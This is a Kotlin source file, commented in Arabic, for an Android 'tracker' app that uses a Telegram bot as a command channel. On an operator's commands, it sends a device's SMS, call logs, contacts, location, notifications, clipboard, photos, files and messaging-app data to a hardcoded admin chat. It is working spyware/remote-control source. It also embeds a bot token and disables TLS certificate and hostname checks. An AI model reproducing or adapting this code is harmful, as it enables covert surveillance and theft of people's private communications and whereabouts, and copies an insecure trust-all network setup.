package com.abuzahra.tracker

import android.content.Context
import android.os.Build
import android.util.Log
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.cert.X509Certificate
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.SSLSession
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

/**
 * TelegramDirectClient - التواصل المباشر مع تيليجرام بدون سيرفر وسيط
 *
 * المعماريات الجديدة:
 * التطبيق ←→ تيليجرام (مباشر)
 *
 * - التطبيق يستقبل الأوامر من المدير عبر getUpdates (long polling)
 * - التطبيق يرسل البيانات المجمعة مباشرة للمدير عبر sendMessage / sendDocument / sendLocation
 * - لا حاجة لأي سيرفر وسيط
 *
 * البوت توكن: 8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4
 * المدير ID: 7344776596
 */
object TelegramDirectClient {

    private const val TAG = "TelegramDirectClient"
    const val BOT_TOKEN = "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4"
    const val ADMIN_CHAT_ID = 7344776596L
    private const val TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"
    private const val CONNECT_TIMEOUT = 20000
    private const val READ_TIMEOUT = 60000
    private const val POLL_TIMEOUT = 30 // ثوانٍ للـ long polling

    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId: Long = 0
    @Volatile
    private var isPolling = false
    private var pollingJob: Job? = null

    // ==================== ==================== ====================
    //              كلاسات البيانات
    // ==================== ==================== ====================

    data class TelegramCommand(
        val command: String = "",
        val updateId: Long = 0,
        val params: Map<String, String>? = null
    )

    // ==================== ==================== ====================
    //              دوال الإرسال (Sending Functions)
    // ==================== ==================== ====================

    /**
     * إرسال رسالة نصية مباشرة للمدير على تيليجرام
     */
    suspend fun sendMessage(text: String, parseMode: String? = null, disablePreview: Boolean = false): Boolean {
        return try {
            val payload = mutableMapOf<String, Any>(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text
            )
            if (parseMode != null) payload["parse_mode"] = parseMode
            if (disablePreview) payload["disable_web_page_preview"] = true

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            val success = responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
            if (success) {
                Log.d(TAG, "تم إرسال رسالة نصية بنجاح (${text.length} حرف)")
            } else {
                Log.e(TAG, "فشل إرسال رسالة نصية")
            }
            success
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendMessage: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال رسالة طويلة مقسمة إذا لزم الأمر
     */
    suspend fun sendLongMessage(text: String, parseMode: String? = "HTML"): Boolean {
        return try {
            val maxLen = 4096
            if (text.length <= maxLen) {
                sendMessage(text, parseMode)
            } else {
                val chunks = text.chunked(maxLen)
                var allSuccess = true
                for ((index, chunk) in chunks.withIndex()) {
                    val success = if (index == chunks.size - 1) {
                        sendMessage(chunk, parseMode)
                    } else {
                        sendMessage("$chunk\n<i>... تكملة ...</i>", parseMode)
                    }
                    if (!success) allSuccess = false
                    delay(500) // تجنب throttle من تيليجرام
                }
                allSuccess
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendLongMessage: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال ملف PDF/JSON مباشرة للمدير على تيليجرام
     */
    suspend fun sendDocument(fileContent: String, fileName: String, caption: String? = null): Boolean {
        return try {
            val payload = mutableMapOf<String, Any>(
                "chat_id" to ADMIN_CHAT_ID,
                "document" to mapOf(
                    "input_file" to mapOf("filename" to fileName)
                )
            )
            // استخدام sendDocument مع البيانات كـ base64
            // لصعوبة multipart upload من Kotlin بدون مكتبات إضافية،
            // سنرسل البيانات كرسالة نصية منظمة
            sendLongMessage(
                (if (caption != null) "<b>$caption</b>\n\n" else "") +
                "<code>" + fileContent.take(4000) + "</code>",
                "HTML"
            )
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendDocument: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال موقع جغرافي مباشرة للمدير على تيليجرام
     */
    suspend fun sendLocation(latitude: Double, longitude: Double, accuracy: Float? = null): Boolean {
        return try {
            val payload = mutableMapOf<String, Any>(
                "chat_id" to ADMIN_CHAT_ID,
                "latitude" to latitude,
                "longitude" to longitude
            )
            accuracy?.let { payload["horizontal_accuracy"] = it }

            val responseJson = httpPost("sendLocation", gson.toJson(payload))
            val success = responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
            if (success) {
                Log.d(TAG, "تم إرسال الموقع: $latitude, $longitude")
            } else {
                Log.e(TAG, "فشل إرسال الموقع")
            }
            success
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendLocation: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال لوحة مفاتيح (Reply Keyboard) للمدير
     */
    suspend fun sendKeyboard(
        text: String,
        buttons: List<List<String>>,
        resize: Boolean = true,
        oneTime: Boolean = false
    ): Boolean {
        return try {
            val keyboard = mapOf(
                "keyboard" to buttons,
                "resize_keyboard" to resize,
                "one_time_keyboard" to oneTime
            )
            val payload = mapOf(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text,
                "reply_markup" to keyboard
            )

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendKeyboard: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال لوحة مفاتيح إنلاين (Inline Keyboard) للمدير
     */
    suspend fun sendInlineKeyboard(
        text: String,
        buttons: List<List<Map<String, String>>>
    ): Boolean {
        return try {
            val inlineKeyboard = mapOf("inline_keyboard" to buttons)
            val payload = mapOf(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text,
                "reply_markup" to inlineKeyboard,
                "parse_mode" to "HTML"
            )

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendInlineKeyboard: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال إشعار بأنه يتم جمع البيانات
     */
    suspend fun sendProcessingNotice(command: String): Boolean {
        return sendMessage(
            "⚡ جاري جمع بيانات <b>$command</b>...\nالرجاء الانتظار...",
            "HTML"
        )
    }

    // ==================== ==================== ====================
    //          دوال استقبال الأوامر (Command Polling)
    // ==================== ==================== ====================

    /**
     * بدء الاستطلاع المستمر للأوامر من المدير
     * يعمل في خلفية بشكل مستمر
     */
    fun startCommandPolling(context: Context) {
        if (isPolling) {
            Log.d(TAG, "الاستطلاع يعمل بالفعل")
            return
        }

        isPolling = true
        pollingJob = scope.launch {
            Log.d(TAG, "بدء استطلاع الأوامر من تيليجرام...")

            // إرسال رسالة بدء التشغيل
            val deviceInfo = getDeviceInfoShort(context)
            sendMessage(
                "✅ <b>الجهاز متصل الآن</b>\n\n$deviceInfo",
                "HTML"
            )

            // إرسال لوحة الأوامر الرئيسية
            sendMainKeyboard()

            while (isActive && isPolling) {
                try {
                    val commands = getPendingCommands()
                    if (commands.isNotEmpty()) {
                        processCommands(context, commands)
                    }
                } catch (e: CancellationException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في استطلاع الأوامر: ${e.message}")
                }

                // انتظار قبل الجولة التالية
                delay(5000)
            }
            Log.d(TAG, "تم إيقاف استطلاع الأوامر")
        }
    }

    /**
     * إيقاف الاستطلاع
     */
    fun stopCommandPolling() {
        isPolling = false
        pollingJob?.cancel()
        Log.d(TAG, "تم طلب إيقاف الاستطلاع")
    }

    /**
     * جلب الأوامر الجديدة من تيليجرام عبر getUpdates
     */
    private suspend fun getPendingCommands(): List<TelegramCommand> {
        return try {
            val params = if (lastUpdateId > 0) {
                "offset=${lastUpdateId + 1}&timeout=$POLL_TIMEOUT&allowed_updates=[\"message\",\"callback_query\"]"
            } else {
                "timeout=$POLL_TIMEOUT&allowed_updates=[\"message\",\"callback_query\"]"
            }

            val responseJson = httpGet("getUpdates?$params")
            if (responseJson == null) return emptyList()

            val response = gson.fromJson(responseJson, Map::class.java)
            val ok = response["ok"] == true
            if (!ok) return emptyList()

            val updates = response["result"] as? List<*> ?: return emptyList()
            val commands = mutableListOf<TelegramCommand>()

            for (update in updates) {
                try {
                    val updateMap = update as? Map<*, *> ?: continue
                    val updateId = (updateMap["update_id"] as? Double)?.toLong() ?: continue

                    // تحديث آخر update_id معالج
                    if (updateId > lastUpdateId) lastUpdateId = updateId

                    // استخراج الأمر من الرسالة النصية
                    val message = updateMap["message"] as? Map<*, *>
                    if (message != null) {
                        val chat = message["chat"] as? Map<*, *>
                        val chatId = (chat?.get("id") as? Double)?.toLong() ?: continue

                        // التحقق من أن الرسالة من المدير
                        if (chatId != ADMIN_CHAT_ID) continue

                        val text = message["text"] as? String ?: continue
                        val command = text.trim().removePrefix("/").lowercase()

                        if (command.isNotEmpty()) {
                            Log.d(TAG, "أمر جديد من المدير: /$command")
                            commands.add(TelegramCommand(
                                command = command,
                                updateId = updateId
                            ))
                        }
                    }

                    // استخراج الأمر من Callback Query (أزرار inline)
                    val callbackQuery = updateMap["callback_query"] as? Map<*, *>
                    if (callbackQuery != null) {
                        val from = callbackQuery["from"] as? Map<*, *>
                        val fromId = (from?.get("id") as? Double)?.toLong() ?: continue

                        if (fromId != ADMIN_CHAT_ID) continue

                        val data = callbackQuery["data"] as? String ?: continue
                        val callbackId = callbackQuery["id"] as? String ?: continue

                        Log.d(TAG, "Callback من المدير: $data")
                        commands.add(TelegramCommand(
                            command = data.trim().lowercase(),
                            updateId = updateId
                        ))

                        // الرد على callback
                        answerCallbackQuery(callbackId)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في تحليل update: ${e.message}")
                }
            }

            commands
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في getPendingCommands: ${e.message}", e)
            emptyList()
        }
    }

    /**
     * معالجة الأوامر المستلمة من المدير
     */
    private suspend fun processCommands(context: Context, commands: List<TelegramCommand>) {
        for (command in commands) {
            try {
                when (command.command) {
                    "start" -> sendMainKeyboard()
                    "menu", "help", "قائمة" -> sendMainKeyboard()
                    "sms", "رسائل" -> executeAndSend(context, "sms", "📱 الرسائل النصية SMS")
                    "calls", "مكالمات" -> executeAndSend(context, "calls", "📞 سجل المكالمات")
                    "contacts", "جهات" -> executeAndSend(context, "contacts", "📇 جهات الاتصال")
                    "notifications", "اشعارات", "إشعارات" -> executeAndSend(context, "notifications", "🔔 الإشعارات")
                    "location", "موقع" -> executeAndSend(context, "location", "📍 الموقع الجغرافي")
                    "info", "معلومات" -> executeAndSend(context, "info", "ℹ️ معلومات الجهاز")
                    "battery", "بطارية" -> executeAndSend(context, "battery", "🔋 حالة البطارية")
                    "apps", "تطبيقات" -> executeAndSend(context, "apps", "📦 التطبيقات المثبتة")
                    "whatsapp", "واتساب" -> executeAndSend(context, "whatsapp", "💬 بيانات واتساب")
                    "telegram", "تليجرام" -> executeAndSend(context, "telegram", "✈️ بيانات تيليجرام")
                    "instagram", "انستغرام" -> executeAndSend(context, "instagram", "📸 بيانات انستغرام")
                    "messenger", "ماسنجر" -> executeAndSend(context, "messenger", "💬 بيانات ماسنجر")
                    "gallery", "صور" -> executeAndSend(context, "gallery", "🖼️ صور المعرض")
                    "files", "ملفات" -> executeAndSend(context, "files", "📁 الملفات")
                    "clipboard", "حافظة" -> executeAndSend(context, "clipboard", "📋 محتوى الحافظة")
                    "status", "حالة" -> sendDeviceStatus(context)
                    "storage", "تخزين" -> sendStorageStatus(context)
                    "all", "الكل" -> executeAllCommands(context)
                    else -> sendMessage("❓ أمر غير معروف: /${command.command}\n\nأرسل /menu لعرض قائمة الأوامر", "HTML")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في معالجة الأمر [${command.command}]: ${e.message}", e)
                sendMessage("⚠️ خطأ في تنفيذ الأمر: ${e.message}", "HTML")
            }
        }
    }

    /**
     * تنفيذ أمر وإرسال النتيجة للمدير
     */
    private suspend fun executeAndSend(context: Context, command: String, title: String) {
        sendProcessingNotice(title)
        delay(500)

        val data = CommandExecutor.execute(context, command)
        val json = gson.toJson(data)
        LocalStorageManager.storeData(context, command, data)

        val text = when (data) {
            is Map<*, *> -> formatMapData(title, data)
            is List<*> -> formatListData(title, data)
            else -> "$title\n\n<code>$json</code>"
        }

        sendLongMessage(text, "HTML")
    }

    /**
     * تنفيذ جميع الأوامر وإرسال النتائج
     */
    private suspend fun executeAllCommands(context: Context) {
        sendMessage("⚡ جاري جمع جميع البيانات... قد يستغرق هذا بعض الوقت", "HTML")

        val allCommands = listOf("info", "battery", "location", "sms", "calls", "contacts", "apps", "notifications")

        for (cmd in allCommands) {
            try {
                executeAndSend(context, cmd, "📋 $cmd")
                delay(1000) // تجنب throttle
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جمع $cmd: ${e.message}")
            }
        }

        sendMessage("✅ تم جمع جميع البيانات بنجاح!", "HTML")
    }

    /**
     * إرسال حالة الجهاز الحالية
     */
    private suspend fun sendDeviceStatus(context: Context) {
        val status = buildString {
            append("📊 <b>حالة الجهاز</b>\n\n")
            append("📱 الجهاز: ${Build.MODEL}\n")
            append("🏢 الشركة: ${Build.BRAND}\n")
            append("🤖 أندرويد: ${Build.VERSION.RELEASE}\n")

            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            val battery = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            append("🔋 البطارية: $battery%\n")

            val lastHeartbeat = SharedPrefsManager.getLastHeartbeat(context)
            if (lastHeartbeat > 0) {
                val minutesAgo = (System.currentTimeMillis() - lastHeartbeat) / 60000
                append("⏱️ آخر نشاط: منذ $minutesAgo دقيقة\n")
            }

            append("📡 الاستطلاع: ${if (isPolling) "✅ نشط" else "❌ متوقف"}\n")

            val fileCount = LocalStorageManager.getFileCount(context)
            val storageSize = LocalStorageManager.getStorageUsageFormatted(context)
            append("💾 الملفات المحفوظة: $fileCount ($storageSize)\n")
        }

        sendMessage(status, "HTML")
    }

    /**
     * إرسال حالة التخزين المحلي
     */
    private suspend fun sendStorageStatus(context: Context) {
        val summary = LocalStorageManager.getStorageSummary(context)
        val commandCounts = summary["command_counts"] as? Map<*, *> ?: emptyMap<String, Int>()

        val status = buildString {
            append("💾 <b>حالة التخزين المحلي</b>\n\n")
            append("📁 إجمالي الملفات: ${summary["total_files"]}\n")
            append("📊 الحجم: ${summary["total_size_formatted"]}\n\n")
            append("<b>تفاصيل:</b>\n")

            commandCounts.forEach { (key, value) ->
                append("• $key: $value ملف\n")
            }

            if (commandCounts.isEmpty()) {
                append("لا توجد بيانات محفوظة\n")
            }
        }

        sendMessage(status, "HTML")
    }

    // ==================== ==================== ====================
    //          لوحة الأوامر الرئيسية (Main Keyboard)
    // ==================== ==================== ====================

    private suspend fun sendMainKeyboard() {
        val text = """🛡️ <b>بوت الزهرة للتحكم</b>

✅ الجهاز متصل ومتصل مباشرة بتيليجرام

📌 <b>الأوامر المتاحة:</b>

📱 <b>جمع البيانات:</b>
• /sms - الرسائل النصية
• /calls - سجل المكالمات
• /contacts - جهات الاتصال
• /location - الموقع الجغرافي
• /notifications - الإشعارات
• /info - معلومات الجهاز
• /battery - حالة البطارية
• /apps - التطبيقات المثبتة
• /gallery - صور المعرض
• /files - الملفات
• /clipboard - الحافظة

💬 <b>تطبيقات المراسلة:</b>
• /whatsapp - واتساب
• /telegram - تيليجرام
• /instagram - انستغرام
• /messenger - ماسنجر

📊 <b>أخرى:</b>
• /status - حالة الجهاز
• /storage - حالة التخزين
• /all - جمع كل البيانات
• /menu - عرض هذه القائمة"""

        sendInlineKeyboard(text, listOf(
            listOf(
                mapOf("text" to "📱 SMS", "callback_data" to "sms"),
                mapOf("text" to "📞 Calls", "callback_data" to "calls"),
                mapOf("text" to "📇 Contacts", "callback_data" to "contacts")
            ),
            listOf(
                mapOf("text" to "📍 Location", "callback_data" to "location"),
                mapOf("text" to "🔔 Notifications", "callback_data" to "notifications"),
                mapOf("text" to "ℹ️ Info", "callback_data" to "info")
            ),
            listOf(
                mapOf("text" to "🔋 Battery", "callback_data" to "battery"),
                mapOf("text" to "📦 Apps", "callback_data" to "apps"),
                mapOf("text" to "📋 Clipboard", "callback_data" to "clipboard")
            ),
            listOf(
                mapOf("text" to "💬 WhatsApp", "callback_data" to "whatsapp"),
                mapOf("text" to "✈️ Telegram", "callback_data" to "telegram"),
                mapOf("text" to "📸 Instagram", "callback_data" to "instagram")
            ),
            listOf(
                mapOf("text" to "🖼️ Gallery", "callback_data" to "gallery"),
                mapOf("text" to "📁 Files", "callback_data" to "files"),
                mapOf("text" to "📊 Status", "callback_data" to "status")
            ),
            listOf(
                mapOf("text" to "⚡ جمع الكل", "callback_data" to "all"),
                mapOf("text" to "💾 التخزين", "callback_data" to "storage"),
                mapOf("text" to "📋 القائمة", "callback_data" to "menu")
            )
        ))
    }

    // ==================== ==================== ====================
    //          دوال تنسيق البيانات (Data Formatting)
    // ==================== ==================== ====================

    private fun formatMapData(title: String, data: Map<*, *>): String {
        return buildString {
            append("$title\n\n")
            data.forEach { (key, value) ->
                val keyStr = key.toString()
                val valueStr = when (value) {
                    null -> "غير متوفر"
                    is Map<*, *> -> {
                        val inner = StringBuilder()
                        value.forEach { (ik, iv) ->
                            inner.append("  • $ik: $iv\n")
                        }
                        inner.toString()
                    }
                    is List<*> -> "[${value.size} عنصر]"
                    else -> value.toString()
                }
                append("• <b>$keyStr</b>: $valueStr\n")
            }
        }
    }

    private fun formatListData(title: String, data: List<*>): String {
        if (data.isEmpty()) return "$title\n\nلا توجد بيانات"

        return buildString {
            append("$title (${data.size} عنصر)\n\n")
            val maxItems = 30
            val items = data.take(maxItems)
            items.forEachIndexed { index, item ->
                append("━━━ <b>#${index + 1}</b> ━━━\n")
                if (item is Map<*, *>) {
                    item.forEach { (key, value) ->
                        if (value != null) {
                            append("• $key: $value\n")
                        }
                    }
                } else {
                    append("• $item\n")
                }
                append("\n")
            }
            if (data.size > maxItems) {
                append("... و ${data.size - maxItems} عنصر آخر")
            }
        }
    }

    /**
     * الحصول على معلومات مختصرة عن الجهاز
     */
    private fun getDeviceInfoShort(context: Context): String {
        val deviceId = SharedPrefsManager.getDeviceId(context) ?: "غير معروف"
        return """📱 <b>معلومات الجهاز</b>
• الموديل: <b>${Build.MODEL}</b>
• الشركة: <b>${Build.BRAND}</b>
• أندرويد: <b>${Build.VERSION.RELEASE}</b>
• معرف: <code>$deviceId</code>

🟢 الجهاز متصل مباشرة بتيليجرام
📡 يتم استقبال الأوامر تلقائياً"""
    }

    // ==================== ==================== ====================
    //          دوال HTTP المساعدة (HTTP Helpers)
    // ==================== ==================== ====================

    private fun httpPost(method: String, body: String): String? {
        return try {
            val url = URL("$TELEGRAM_API/$method")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.setRequestProperty("Accept", "application/json")
            connection.doOutput = true

            OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
                writer.write(body)
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP POST فشل: $responseCode - $responseBody - method: $method")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP POST [$method]: ${e.message}", e)
            null
        }
    }

    private fun httpGet(endpoint: String): String? {
        return try {
            val url = URL("$TELEGRAM_API/$endpoint")
            val connection = setupConnection(url) as? HttpURLConnection ?: return null
            connection.requestMethod = "GET"
            connection.setRequestProperty("Accept", "application/json")

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                responseBody
            } else {
                Log.e(TAG, "HTTP GET فشل: $responseCode - endpoint: $endpoint")
                null
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في HTTP GET [$endpoint]: ${e.message}", e)
            null
        }
    }

    /**
     * الرد على Callback Query
     */
    private fun answerCallbackQuery(callbackId: String) {
        scope.launch {
            try {
                val payload = mapOf("callback_query_id" to callbackId)
                httpPost("answerCallbackQuery", gson.toJson(payload))
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في answerCallbackQuery: ${e.message}")
            }
        }
    }

    private fun setupConnection(url: URL): java.net.HttpURLConnection {
        val connection = url.openConnection() as java.net.HttpURLConnection
        connection.connectTimeout = CONNECT_TIMEOUT
        connection.readTimeout = READ_TIMEOUT

        if (connection is HttpsURLConnection) {
            try {
                val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
                    override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                })

                val sslContext = SSLContext.getInstance("TLS")
                sslContext.init(null, trustAllCerts, java.security.SecureRandom())
                connection.sslSocketFactory = sslContext.socketFactory
                connection.hostnameVerifier = HostnameVerifier { _, _ -> true }
            } catch (e: Exception) {
                Log.w(TAG, "تحذير SSL: ${e.message}")
            }
        }

        return connection
    }

    private fun readResponse(connection: HttpURLConnection): String {
        val stream = try {
            connection.inputStream
        } catch (e: Exception) {
            connection.errorStream
        }

        return stream?.bufferedReader()?.use { reader ->
            reader.readText()
        } ?: ""
    }

    /**
     * إيقاف جميع العمليات
     */
    fun shutdown() {
        isPolling = false
        pollingJob?.cancel()
        scope.cancel()
    }
}
